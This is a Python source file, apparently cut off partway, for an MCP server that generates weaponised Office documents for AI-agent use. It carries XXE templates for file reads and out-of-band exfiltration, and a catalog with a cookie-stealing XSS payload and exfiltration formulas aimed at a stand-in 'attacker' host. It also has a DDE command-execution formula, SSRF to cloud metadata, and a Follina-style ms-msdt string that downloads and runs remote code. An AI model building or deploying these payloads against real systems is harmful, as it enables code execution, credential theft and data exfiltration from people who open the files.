"""
Office Exploit MCP Server

Creates malicious Microsoft Office documents (XLSX, DOCX, PPTX) with various
payloads for authorized security testing. Office documents are ZIP archives
containing XML, making them vectors for XSS, XXE, SSRF, formula injection,
and other attacks.

Supported attack types:
- XSS via sheet name (CVE-2025-22131)
- XXE file read / OOB exfiltration
- SSRF via external images/links
- Formula injection (=CMD|, =HYPERLINK)
- Template injection (remote templates, Follina-style)
- Action link attacks (PPTX hover/click)
"""

import asyncio
import base64
import hashlib
import io
import os
import re
import zipfile
from pathlib import Path
from typing import Any, Dict, List, Optional
from xml.etree import ElementTree as ET

from lxml import etree

from mcp_common import BaseMCPServer, ToolResult, ToolError


class OfficeExploitServer(BaseMCPServer):
    """MCP server for creating malicious Office documents."""

    # =========================================================================
    # CONSTANTS
    # =========================================================================

    # XXE payload templates
    XXE_TEMPLATES = {
        "oob_http": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "{callback_url}">
  %xxe;
]>''',
        "oob_ftp": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "ftp://{callback_url}">
  %xxe;
]>''',
        "file_read": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://{file_path}">
]>''',
        "ssrf": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "{target_url}">
]>''',
    }

    # XML namespaces for Office formats
    XLSX_NS = {
        "main": "http://schemas.openxmlformats.org/spreadsheetml/2006/main",
        "r": "http://schemas.openxmlformats.org/officeDocument/2006/relationships",
        "mc": "http://schemas.openxmlformats.org/markup-compatibility/2006",
    }

    DOCX_NS = {
        "w": "http://schemas.openxmlformats.org/wordprocessingml/2006/main",
        "r": "http://schemas.openxmlformats.org/officeDocument/2006/relationships",
        "a": "http://schemas.openxmlformats.org/drawingml/2006/main",
        "wp": "http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing",
        "pic": "http://schemas.openxmlformats.org/drawingml/2006/picture",
    }

    PPTX_NS = {
        "p": "http://schemas.openxmlformats.org/presentationml/2006/main",
        "r": "http://schemas.openxmlformats.org/officeDocument/2006/relationships",
        "a": "http://schemas.openxmlformats.org/drawingml/2006/main",
    }

    RELS_NS = "http://schemas.openxmlformats.org/package/2006/relationships"
    CONTENT_TYPES_NS = "http://schemas.openxmlformats.org/package/2006/content-types"

    # XML file paths within Office archives
    XLSX_XML_PATHS = {
        "sharedStrings": "xl/sharedStrings.xml",
        "workbook": "xl/workbook.xml",
        "sheet1": "xl/worksheets/sheet1.xml",
        "styles": "xl/styles.xml",
        "contentTypes": "[Content_Types].xml",
    }

    DOCX_XML_PATHS = {
        "document": "word/document.xml",
        "settings": "word/settings.xml",
        "styles": "word/styles.xml",
        "fontTable": "word/fontTable.xml",
        "webSettings": "word/webSettings.xml",
    }

    PPTX_XML_PATHS = {
        "presentation": "ppt/presentation.xml",
        "slide1": "ppt/slides/slide1.xml",
        "slideLayout": "ppt/slideLayouts/slideLayout1.xml",
        "slideMaster": "ppt/slideMasters/slideMaster1.xml",
    }

    # Payload catalog for list_payloads
    PAYLOAD_CATALOG = {
        "xlsx": {
            "xss": [
                {
                    "name": "xss_sheetname",
                    "description": "XSS via sheet name - triggers in web UIs that render sheet names (CVE-2025-22131)",
                    "example": '<script>fetch("http://attacker/c="+document.cookie)</script>',
                },
            ],
            "xxe": [
                {
                    "name": "oob_http",
                    "description": "Out-of-band XXE via HTTP callback",
                    "example": "xxe_style='oob_http', xxe_callback_url='http://attacker:8000/xxe'",
                },
                {
                    "name": "file_read",
                    "description": "XXE file read (requires error-based or in-band exfil)",
                    "example": "xxe_style='file_read', xxe_file_to_read='/etc/passwd'",
                },
            ],
            "ssrf": [
                {
                    "name": "external_link",
                    "description": "SSRF via external workbook reference",
                    "example": "payload_type='external_link', external_url='http://169.254.169.254/'",
                },
            ],
            "formula": [
                {
                    "name": "hyperlink",
                    "description": "Formula injection via HYPERLINK function",
                    "example": '=HYPERLINK("http://attacker/track?data="&A1)',
                },
                {
                    "name": "cmd_exec",
                    "description": "DDE command execution (legacy Excel)",
                    "example": "=CMD|'calc'!A0",
                },
            ],
        },
        "docx": {
            "xxe": [
                {
                    "name": "oob_http",
                    "description": "Out-of-band XXE via HTTP callback",
                    "example": "xxe_style='oob_http', xxe_callback_url='http://attacker:8000/xxe'",
                },
            ],
            "ssrf": [
                {
                    "name": "external_image",
                    "description": "SSRF via external image reference",
                    "example": "payload_type='external_image', external_url='http://169.254.169.254/'",
                },
                {
                    "name": "template_injection",
                    "description": "Remote template loading for SSRF/RCE",
                    "example": "payload_type='template_injection', template_url='http://attacker/evil.dotx'",
                },
            ],
        },
        "pptx": {
            "xxe": [
                {
                    "name": "oob_http",
                    "description": "Out-of-band XXE via HTTP callback",
                    "example": "xxe_style='oob_http', xxe_callback_url='http://attacker:8000/xxe'",
                },
            ],
            "ssrf": [
                {
                    "name": "external_media",
                    "description": "SSRF via external media reference",
                    "example": "payload_type='external_media', external_url='http://169.254.169.254/'",
                },
                {
                    "name": "action_link",
                    "description": "Action link to external URL on hover/click",
                    "example": "payload_type='action_link', action_target='http://attacker/', trigger='hover'",
                },
            ],
        },
    }

    # =========================================================================
    # INITIALIZATION
    # =========================================================================

    def __init__(self):
        super().__init__(
            "office-exploit",
            "Create malicious Microsoft Office documents with XSS, XXE, SSRF, and formula injection payloads",
            version="1.0.0"
        )

        # Register methods
        self.register_method(
            name="create_xlsx",
            description="Create a malicious Excel file with XSS, XXE, formula injection, or external link payloads",
            params={
                "output_path": {
                    "type": "string",
                    "required": True,
                    "description": "Path to save the file (must be within /session/)",
                },
                "sheets": {
                    "type": "array",
                    "required": True,
                    "description": "Array of sheet definitions: [{name: string, data?: string[][]}]. Sheet names are NOT sanitized - use for XSS payloads.",
                    "items": {"type": "object"},
                },
                "payload_type": {
                    "type": "enum",
                    "values": ["xss_sheetname", "xxe", "formula", "external_link"],
                    "description": "Type of payload to inject",
                },
                "xxe_style": {
                    "type": "enum",
                    "values": ["oob_http", "oob_ftp", "file_read", "ssrf"],
                    "default": "oob_http",
                    "description": "XXE injection style (when payload_type='xxe')",
                },
                "xxe_target_xml": {
                    "type": "enum",
                    "values": ["sharedStrings", "workbook", "sheet1", "styles", "contentTypes", "multi"],
                    "default": "sharedStrings",
                    "description": "XML file to inject XXE into",
                },
                "xxe_callback_url": {
                    "type": "string",
                    "description": "Callback URL for OOB XXE (e.g., 'http://attacker:8000/xxe')",
                },
                "xxe_file_to_read": {
                    "type": "string",
                    "description": "File path for file_read XXE (e.g., '/etc/passwd')",
                },
                "formula": {
                    "type": "string",
                    "description": "Formula to inject in cell A1 (shortcut for payload_type='formula')",
                },
                "external_link_type": {
                    "type": "enum",
                    "values": ["workbook_ref", "web_query"],
                    "default": "workbook_ref",
                    "description": "Type of external link (when payload_type='external_link')",
                },
                "external_url": {
                    "type": "string",
                    "description": "External URL for SSRF payloads",
                },
            },
            handler=self.create_xlsx,
        )

        self.register_method(
            name="create_docx",
            description="Create a malicious Word file with XXE, external image, or template injection payloads",
            params={
                "output_path": {
                    "type": "string",
                    "required": True,
                    "description": "Path to save the file (must be within /session/)",
                },
                "content": {
                    "type": "string",
                    "description": "Document text content",
                },
                "payload_type": {
                    "type": "enum",
                    "values": ["xxe", "external_image", "template_injection"],
                    "description": "Type of payload to inject",
                },
                "xxe_style": {
                    "type": "enum",
                    "values": ["oob_http", "oob_ftp", "file_read", "ssrf"],
                    "default": "oob_http",
                    "description": "XXE injection style",
                },
                "xxe_target_xml": {
                    "type": "enum",
                    "values": ["document", "settings", "styles", "fontTable", "webSettings", "multi"],
                    "default": "document",
                    "description": "XML file to inject XXE into",
                },
                "xxe_callback_url": {
                    "type": "string",
                    "description": "Callback URL for OOB XXE",
                },
                "xxe_file_to_read": {
                    "type": "string",
                    "description": "File path for file_read XXE",
                },
                "external_url": {
                    "type": "string",
                    "description": "External URL for image/template SSRF",
                },
                "template_type": {
                    "type": "enum",
                    "values": ["remote", "msdt"],
                    "default": "remote",
                    "description": "Template injection type (remote=standard, msdt=Follina-style)",
                },
                "template_url": {
                    "type": "string",
                    "description": "URL for remote template",
                },
            },
            handler=self.create_docx,
        )

        self.register_method(
            name="create_pptx",
            description="Create a malicious PowerPoint file with XXE, external media, or action link payloads",
            params={
                "output_path": {
                    "type": "string",
                    "required": True,
                    "description": "Path to save the file (must be within /session/)",
                },
                "payload_type": {
                    "type": "enum",
                    "values": ["xxe", "external_media", "action_link"],
                    "description": "Type of payload to inject",
                },
                "xxe_style": {
                    "type": "enum",
                    "values": ["oob_http", "oob_ftp", "file_read", "ssrf"],
                    "default": "oob_http",
                    "description": "XXE injection style",
                },
                "xxe_target_xml": {
                    "type": "enum",
                    "values": ["presentation", "slide1", "slideLayout", "slideMaster", "multi"],
                    "default": "presentation",
                    "description": "XML file to inject XXE into",
                },
                "xxe_callback_url": {
                    "type": "string",
                    "description": "Callback URL for OOB XXE",
                },
                "xxe_file_to_read": {
                    "type": "string",
                    "description": "File path for file_read XXE",
                },
                "external_url": {
                    "type": "string",
                    "description": "External URL for media/action SSRF",
                },
                "trigger": {
                    "type": "enum",
                    "values": ["hover", "click"],
                    "default": "hover",
                    "description": "Action link trigger (when payload_type='action_link')",
                },
                "action": {
                    "type": "enum",
                    "values": ["hyperlink", "program"],
                    "default": "hyperlink",
                    "description": "Action type (hyperlink=URL, program=executable)",
                },
                "action_target": {
                    "type": "string",
                    "description": "Target URL or program path for action link",
                },
            },
            handler=self.create_pptx,
        )

        self.register_method(
            name="modify_office_xml",
            description="Low-level XML manipulation for custom payloads not covered by create_* methods",
            params={
                "input_path": {
                    "type": "string",
                    "required": True,
                    "description": "Path to existing Office file",
                },
                "output_path": {
                    "type": "string",
                    "required": True,
                    "description": "Path to save modified file (must be within /session/)",
                },
                "xml_file": {
                    "type": "string",
                    "required": True,
                    "description": "XML file within archive (e.g., 'xl/workbook.xml', 'word/document.xml')",
                },
                "modifications": {
                    "type": "array",
                    "required": True,
                    "description": "Array of modifications: [{xpath: string, action: 'replace'|'insert'|'delete', content: string}]",
                    "items": {"type": "object"},
                },
            },
            handler=self.modify_office_xml,
        )

        self.register_method(
            name="extract_office_xml",
            description="Extract and inspect XML files from Office documents",
            params={
                "input_path": {
                    "type": "string",
                    "required": True,
                    "description": "Path to Office file",
                },
                "xml_file": {
                    "type": "string",
                    "description": "Specific XML file to extract (omit to list all files)",
                },
            },
            handler=self.extract_office_xml,
        )

        self.register_method(
            name="list_payloads",
            description="List available payload templates and examples",
            params={
                "file_type": {
                    "type": "enum",
                    "values": ["xlsx", "docx", "pptx"],
                    "description": "Filter by file type",
                },
                "category": {
                    "type": "enum",
                    "values": ["xss", "xxe", "ssrf", "formula"],
                    "description": "Filter by attack category",
                },
            },
            handler=self.list_payloads,
        )

    # =========================================================================
    # HELPER METHODS
    # =========================================================================

    def _validate_output_path(self, path: str) -> Path:
        """Validate that output path is within /session/ directory."""
        p = Path(path)
        # Resolve to catch ../ traversal attempts
        try:
            resolved = p.resolve()
        except Exception:
            resolved = p

        # Check RESOLVED path starts with /session/ or /tmp/session/ (for testing)
        # Only check resolved path to catch traversal attempts like /session/../etc/passwd
        valid_prefixes = ("/session/", "/tmp/session/")
        if not any(str(resolved).startswith(prefix) for prefix in valid_prefixes):
            raise ToolError(
                message="Output path must be within /session/ directory",
                details=f"Got: {path} (resolved to: {resolved})"
            )

        # Create parent directories if needed
        resolved.parent.mkdir(parents=True, exist_ok=True)
        return resolved

    def _compute_file_hash(self, data: bytes) -> str:
        """Compute SHA256 hash of file data."""
        return hashlib.sha256(data).hexdigest()

    def _build_xxe_payload(
        self,
        style: str,
        callback_url: Optional[str] = None,
        file_to_read: Optional[str] = None,
    ) -> str:
        """Build XXE payload from template."""
        template = self.XXE_TEMPLATES.get(style)
        if not template:
            raise ToolError(message=f"Unknown XXE style: {style}")

        if style in ("oob_http", "oob_ftp"):
            if not callback_url:
                raise ToolError(message=f"xxe_callback_url required for {style}")
            return template.format(callback_url=callback_url)
        elif style == "file_read":
            if not file_to_read:
                raise ToolError(message="xxe_file_to_read required for file_read")
            return template.format(file_path=file_to_read)
        elif style == "ssrf":
            if not callback_url:
                raise ToolError(message="xxe_callback_url required for ssrf")
            return template.format(target_url=callback_url)

        return template

    def _inject_xxe_into_xml(self, xml_content: str, xxe_doctype: str) -> str:
        """Inject XXE DOCTYPE into XML content."""
        # Remove existing XML declaration if present
        xml_content = re.sub(r'<\?xml[^?]*\?>\s*', '', xml_content, flags=re.IGNORECASE)
        # Remove existing DOCTYPE if present
        xml_content = re.sub(r'<!DOCTYPE[^>]*>\s*', '', xml_content, flags=re.IGNORECASE)
        # Prepend XXE payload
        return xxe_doctype + "\n" + xml_content

    def _build_result(
        self,
        path: Path,
        data: bytes,
        payload_type: str,
        injection_locations: List[str],
    ) -> ToolResult:
        """Build standardized result with metadata."""
        return ToolResult(
            success=True,
            data={
                "path": str(path),
                "size_bytes": len(data),
                "sha256": self._compute_file_hash(data),
                "payload_type": payload_type,
                "injection_locations": injection_locations,
                "content_base64": base64.b64encode(data).decode("utf-8"),
            },
        )

    # =========================================================================
    # XLSX GENERATION
    # =========================================================================

    def _create_minimal_xlsx(self, sheets: List[Dict]) -> io.BytesIO:
        """Create minimal valid XLSX structure."""
        buffer = io.BytesIO()

        with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as zf:
            # [Content_Types].xml
            content_types = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="{self.CONTENT_TYPES_NS}">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
  <Override PartName="/xl/sharedStrings.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sharedStrings+xml"/>
  <Override PartName="/xl/styles.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.styles+xml"/>
'''
            for i in range(len(sheets)):
                content_types += f'  <Override PartName="/xl/worksheets/sheet{i+1}.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>\n'
            content_types += "</Types>"
            zf.writestr("[Content_Types].xml", content_types)

            # _rels/.rels
            rels = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="{self.RELS_NS}">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
</Relationships>'''
            zf.writestr("_rels/.rels", rels)

            # xl/workbook.xml - Sheet names are NOT escaped (intentional for XSS)
            workbook = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<workbook xmlns="{self.XLSX_NS['main']}" xmlns:r="{self.XLSX_NS['r']}">
  <sheets>
'''
            for i, sheet in enumerate(sheets):
                # NO SANITIZATION - sheet name goes in raw
                sheet_name = sheet.get("name", f"Sheet{i+1}")
                workbook += f'    <sheet name="{sheet_name}" sheetId="{i+1}" r:id="rId{i+1}"/>\n'
            workbook += '''  </sheets>
</workbook>'''
            zf.writestr("xl/workbook.xml", workbook)

            # xl/_rels/workbook.xml.rels
            wb_rels = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="{self.RELS_NS}">
  <Relationship Id="rId100" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/sharedStrings" Target="sharedStrings.xml"/>
  <Relationship Id="rId101" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/>
'''
            for i in range(len(sheets)):
                wb_rels += f'  <Relationship Id="rId{i+1}" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet{i+1}.xml"/>\n'
            wb_rels += "</Relationships>"
            zf.writestr("xl/_rels/workbook.xml.rels", wb_rels)

            # xl/sharedStrings.xml
            shared_strings = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<sst xmlns="{self.XLSX_NS['main']}" count="0" uniqueCount="0">
</sst>'''
            zf.writestr("xl/sharedStrings.xml", shared_strings)

            # xl/styles.xml (minimal)
            styles = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<styleSheet xmlns="{self.XLSX_NS['main']}">
  <fonts count="1"><font><sz val="11"/><name val="Calibri"/></font></fonts>
  <fills count="1"><fill><patternFill patternType="none"/></fill></fills>
  <borders count="1"><border/></borders>
  <cellStyleXfs count="1"><xf/></cellStyleXfs>
  <cellXfs count="1"><xf/></cellXfs>
</styleSheet>'''
            zf.writestr("xl/styles.xml", styles)

            # xl/worksheets/sheet*.xml
            for i, sheet in enumerate(sheets):
                data = sheet.get("data", [])
                sheet_xml = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<worksheet xmlns="{self.XLSX_NS['main']}">
  <sheetData>
'''
                for row_idx, row in enumerate(data):
                    sheet_xml += f'    <row r="{row_idx + 1}">\n'
                    for col_idx, cell_value in enumerate(row):
                        col_letter = chr(ord('A') + col_idx)
                        cell_ref = f"{col_letter}{row_idx + 1}"
                        # Check if it's a formula
                        if isinstance(cell_value, str) and cell_value.startswith("="):
                            sheet_xml += f'      <c r="{cell_ref}"><f>{cell_value[1:]}</f></c>\n'
                        else:
                            # Inline string (NOT sanitized)
                            sheet_xml += f'      <c r="{cell_ref}" t="inlineStr"><is><t>{cell_value}</t></is></c>\n'
                    sheet_xml += '    </row>\n'
                sheet_xml += '''  </sheetData>
</worksheet>'''
                zf.writestr(f"xl/worksheets/sheet{i+1}.xml", sheet_xml)

        buffer.seek(0)
        return buffer

    def _add_xlsx_external_link(self, buffer: io.BytesIO, external_url: str, link_type: str) -> io.BytesIO:
        """Add external link to XLSX for SSRF."""
        # Read existing content
        content = {}
        with zipfile.ZipFile(buffer, "r") as zf:
            for name in zf.namelist():
                content[name] = zf.read(name)

        # Create new buffer with external link
        new_buffer = io.BytesIO()
        with zipfile.ZipFile(new_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
            for name, data in content.items():
                if name == "[Content_Types].xml":
                    # Add external link content type
                    data = data.decode("utf-8")
                    data = data.replace(
                        "</Types>",
                        '  <Override PartName="/xl/externalLinks/externalLink1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.externalLink+xml"/>\n</Types>'
                    )
                    zf.writestr(name, data)
                elif name == "xl/_rels/workbook.xml.rels":
                    # Add relationship to external link
                    data = data.decode("utf-8")
                    data = data.replace(
                        "</Relationships>",
                        f'  <Relationship Id="rId200" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/externalLink" Target="externalLinks/externalLink1.xml"/>\n</Relationships>'
                    )
                    zf.writestr(name, data)
                else:
                    zf.writestr(name, data)

            # Add external link files
            ext_link = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<externalLink xmlns="{self.XLSX_NS['main']}" xmlns:r="{self.XLSX_NS['r']}">
  <externalBook r:id="rId1">
    <sheetNames>
      <sheetName val="Sheet1"/>
    </sheetNames>
  </externalBook>
</externalLink>'''
            zf.writestr("xl/externalLinks/externalLink1.xml", ext_link)

            ext_link_rels = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="{self.RELS_NS}">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/externalLinkPath" Target="{external_url}" TargetMode="External"/>
</Relationships>'''
            zf.writestr("xl/externalLinks/_rels/externalLink1.xml.rels", ext_link_rels)

        new_buffer.seek(0)
        return new_buffer

    async def create_xlsx(
        self,
        output_path: str,
        sheets: List[Dict],
        payload_type: Optional[str] = None,
        xxe_style: str = "oob_http",
        xxe_target_xml: str = "sharedStrings",
        xxe_callback_url: Optional[str] = None,
        xxe_file_to_read: Optional[str] = None,
        formula: Optional[str] = None,
        external_link_type: str = "workbook_ref",
        external_url: Optional[str] = None,
    ) -> ToolResult:
        """Create a malicious XLSX file."""
        try:
            # Validate payload_type if provided
            valid_payload_types = (None, "xss_sheetname", "xxe", "formula", "external_link")
            if payload_type not in valid_payload_types:
                raise ToolError(
                    message=f"Invalid payload_type: {payload_type}",
                    details=f"Valid types: {', '.join(str(t) for t in valid_payload_types if t)}"
                )

            path = self._validate_output_path(output_path)
            injection_locations = []

            # Handle formula shortcut
            if formula and not payload_type:
                payload_type = "formula"
                if not sheets[0].get("data"):
                    sheets[0]["data"] = [[formula]]
                else:
                    sheets[0]["data"][0][0] = formula

            # Create base XLSX
            buffer = self._create_minimal_xlsx(sheets)

            # Apply payload
            if payload_type == "xss_sheetname":
                # XSS is already in sheet names from _create_minimal_xlsx
                injection_locations.append("xl/workbook.xml")

            elif payload_type == "xxe":
                xxe_payload = self._build_xxe_payload(xxe_style, xxe_callback_url, xxe_file_to_read)

                if xxe_target_xml == "multi":
                    targets = ["sharedStrings", "workbook", "sheet1"]
                else:
                    targets = [xxe_target_xml]

                # Read and modify
                content = {}
                with zipfile.ZipFile(buffer, "r") as zf:
                    for name in zf.namelist():
                        content[name] = zf.read(name)

                buffer = io.BytesIO()
                with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as zf:
                    for name, data in content.items():
                        xml_key = None
                        for key, xml_path in self.XLSX_XML_PATHS.items():
                            if name == xml_path:
                                xml_key = key
                                break

                        if xml_key and xml_key in targets:
                            data = self._inject_xxe_into_xml(data.decode("utf-8"), xxe_payload)
                            injection_locations.append(name)
                            zf.writestr(name, data)
                        else:
                            zf.writestr(name, data)

                buffer.seek(0)

            elif payload_type == "formula":
                # Formula is already in cell data from _create_minimal_xlsx
                injection_locations.append("xl/worksheets/sheet1.xml")

            elif payload_type == "external_link":
                if not external_url:
                    raise ToolError(message="external_url required for external_link payload")
                buffer = self._add_xlsx_external_link(buffer, external_url, external_link_type)
                injection_locations.append("xl/externalLinks/externalLink1.xml")
                injection_locations.append("xl/externalLinks/_rels/externalLink1.xml.rels")

            # Write to file
            data = buffer.getvalue()
            path.write_bytes(data)

            return self._build_result(
                path=path,
                data=data,
                payload_type=payload_type or "none",
                injection_locations=injection_locations,
            )

        except ToolError:
            raise
        except Exception as e:
            self.logger.exception("Error creating XLSX")
            raise ToolError(message="Failed to create XLSX", details=str(e))

    # =========================================================================
    # DOCX GENERATION
    # =========================================================================

    def _create_minimal_docx(self, content: str = "") -> io.BytesIO:
        """Create minimal valid DOCX structure."""
        buffer = io.BytesIO()

        with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as zf:
            # [Content_Types].xml
            content_types = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="{self.CONTENT_TYPES_NS}">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
  <Override PartName="/word/settings.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml"/>
  <Override PartName="/word/styles.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.styles+xml"/>
  <Override PartName="/word/fontTable.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.fontTable+xml"/>
  <Override PartName="/word/webSettings.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.webSettings+xml"/>
</Types>'''
            zf.writestr("[Content_Types].xml", content_types)

            # _rels/.rels
            rels = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="{self.RELS_NS}">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>'''
            zf.writestr("_rels/.rels", rels)

            # word/document.xml
            doc_content = content if content else "Document"
            document = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="{self.DOCX_NS['w']}" xmlns:r="{self.DOCX_NS['r']}">
  <w:body>
    <w:p>
      <w:r>
        <w:t>{doc_content}</w:t>
      </w:r>
    </w:p>
  </w:body>
</w:document>'''
            zf.writestr("word/document.xml", document)

            # word/_rels/document.xml.rels
            doc_rels = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="{self.RELS_NS}">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings" Target="settings.xml"/>
  <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/>
  <Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/fontTable" Target="fontTable.xml"/>
  <Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/webSettings" Target="webSettings.xml"/>
</Relationships>'''
            zf.writestr("word/_rels/document.xml.rels", doc_rels)

            # word/settings.xml
            settings = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:settings xmlns:w="{self.DOCX_NS['w']}" xmlns:r="{self.DOCX_NS['r']}">
</w:settings>'''
            zf.writestr("word/settings.xml", settings)

            # word/styles.xml (minimal)
            styles = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:styles xmlns:w="{self.DOCX_NS['w']}">
</w:styles>'''
            zf.writestr("word/styles.xml", styles)

            # word/fontTable.xml
            font_table = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:fonts xmlns:w="{self.DOCX_NS['w']}">
  <w:font w:name="Calibri"/>
</w:fonts>'''
            zf.writestr("word/fontTable.xml", font_table)

            # word/webSettings.xml
            web_settings = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:webSettings xmlns:w="{self.DOCX_NS['w']}">
</w:webSettings>'''
            zf.writestr("word/webSettings.xml", web_settings)

        buffer.seek(0)
        return buffer

    def _add_docx_external_image(self, buffer: io.BytesIO, external_url: str) -> io.BytesIO:
        """Add external image reference to DOCX for SSRF."""
        content = {}
        with zipfile.ZipFile(buffer, "r") as zf:
            for name in zf.namelist():
                content[name] = zf.read(name)

        new_buffer = io.BytesIO()
        with zipfile.ZipFile(new_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
            for name, data in content.items():
                if name == "word/_rels/document.xml.rels":
                    # Add external image relationship
                    data = data.decode("utf-8")
                    data = data.replace(
                        "</Relationships>",
                        f'  <Relationship Id="rId100" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="{external_url}" TargetMode="External"/>\n</Relationships>'
                    )
                    zf.writestr(name, data)
                elif name == "word/document.xml":
                    # Add drawing element referencing the external image
                    data = data.decode("utf-8")
                    drawing = f'''
    <w:p xmlns:w="{self.DOCX_NS['w']}" xmlns:r="{self.DOCX_NS['r']}" xmlns:wp="{self.DOCX_NS['wp']}" xmlns:a="{self.DOCX_NS['a']}" xmlns:pic="{self.DOCX_NS['pic']}">
      <w:r>
        <w:drawing>
          <wp:inline>
            <a:graphic>
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:pic>
                  <pic:blipFill>
                    <a:blip r:link="rId100"/>
                  </pic:blipFill>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>'''
                    data = data.replace("</w:body>", drawing + "\n  </w:body>")
                    zf.writestr(name, data)
                else:
                    zf.writestr(name, data)

        new_buffer.seek(0)
        return new_buffer

    def _add_docx_template_injection(
        self,
        buffer: io.BytesIO,
        template_url: str,
        template_type: str
    ) -> io.BytesIO:
        """Add template injection to DOCX."""
        content = {}
        with zipfile.ZipFile(buffer, "r") as zf:
            for name in zf.namelist():
                content[name] = zf.read(name)

        new_buffer = io.BytesIO()
        with zipfile.ZipFile(new_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
            for name, data in content.items():
                if name == "word/settings.xml":
                    # Add attached template reference
                    data = data.decode("utf-8")
                    if template_type == "msdt":
                        # Follina-style: use ms-msdt protocol
                        target = template_url if template_url.startswith("ms-msdt:") else f"ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebsupFakeRecov=false;IT_LaunchMethod=ContextMenu;IT_BrowseForFile=/../../$(IEX($(curl {template_url})))i]]\""
                    else:
                        target = template_url
                    data = data.replace(
                        "</w:settings>",
                        f'  <w:attachedTemplate r:id="rId100"/>\n</w:settings>'
                    )
                    zf.writestr(name, data)
                elif name == "word/_rels/settings.xml.rels":
                    # This file might not exist, we'll create it
                    zf.writestr(name, data)
                else:
                    zf.writestr(name, data)

            # Create/update settings.xml.rels
            if template_type == "msdt":
                target_url = template_url if template_url.startswith("ms-msdt:") else template_url
            else:
                target_url = template_url

            settings_rels = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="{self.RELS_NS}">
  <Relationship Id="rId100" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="{target_url}" TargetMode="External"/>
</Relationships>'''
            zf.writestr("word/_rels/settings.xml.rels", settings_rels)

        new_buffer.seek(0)
        return new_buffer

    async def create_docx(
        self,
        output_path: str,
        content: Optional[str] = None,
        payload_type: Optional[str] = None,
        xxe_style: str = "oob_http",
        xxe_target_xml: str = "document",
        xxe_callback_url: Optional[str] = None,
        xxe_file_to_read: Optional[str] = None,
        external_url: Optional[str] = None,
        template_type: str = "remote",
        template_url: Optional[str] = None,
    ) -> ToolResult:
        """Create a malicious DOCX file."""
        try:
            # Validate payload_type if provided
            valid_payload_types = (None, "xxe", "external_image", "template_injection")
